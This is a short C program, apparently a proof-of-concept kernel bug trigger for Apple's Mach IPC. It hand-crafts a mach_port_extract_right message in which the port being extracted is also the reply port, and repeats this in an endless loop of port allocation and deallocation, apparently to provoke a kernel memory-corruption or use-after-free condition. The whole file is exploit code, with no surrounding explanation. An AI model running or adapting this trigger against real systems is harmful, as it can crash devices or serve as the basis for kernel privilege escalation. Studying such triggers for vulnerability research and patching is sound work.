#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <mach/mach.h>

kern_return_t pl_mach_port_extract_right(ipc_space_t task, 
		mach_port_name_t name, mach_msg_type_name_t msgt_name,
        mach_port_t *poly, mach_msg_type_name_t *polyPoly){

#pragma pack(4)
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_port_name_t name;
		mach_msg_type_name_t msgt_name;
	} Request;
#pragma pack(0)

#pragma pack(4)
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t poly;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply;
#pragma pack(0)

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *OutP = &Mess.Out;

	mach_msg_return_t msg_result;


	InP->NDR = NDR_record;

	InP->name = name;

	InP->msgt_name = msgt_name;

	InP->Head.msgh_bits =
		MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	InP->Head.msgh_remote_port = task;
	InP->Head.msgh_local_port = name;
	InP->Head.msgh_id = 3215;
	InP->Head.msgh_size = sizeof(Request);
	InP->Head.msgh_voucher_port = MACH_PORT_NULL;

	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 
			(mach_msg_size_t)sizeof(Request), 
			(mach_msg_size_t)sizeof(Reply), 
			InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	assert(msg_result != KERN_SUCCESS);

	return msg_result;
}

int main() {

	uint32_t port_index = 0x00;

	while (1) {

		mach_port_t port = MACH_PORT_NULL;
		kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
		assert(kr == KERN_SUCCESS);

		if (port_index == 0x00) {
			port_index = port & ~0xff;
		} else {
			/*assert((port & ~0xff) == port_index);*/
		}

		kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
		assert(kr == KERN_SUCCESS);

		(void)pl_mach_port_extract_right(mach_task_self(), port, MACH_MSG_TYPE_MOVE_RECEIVE, NULL, NULL);

		kr = mach_port_deallocate(mach_task_self(), port);
		assert(kr == KERN_SUCCESS);
	}

	return 0;
}
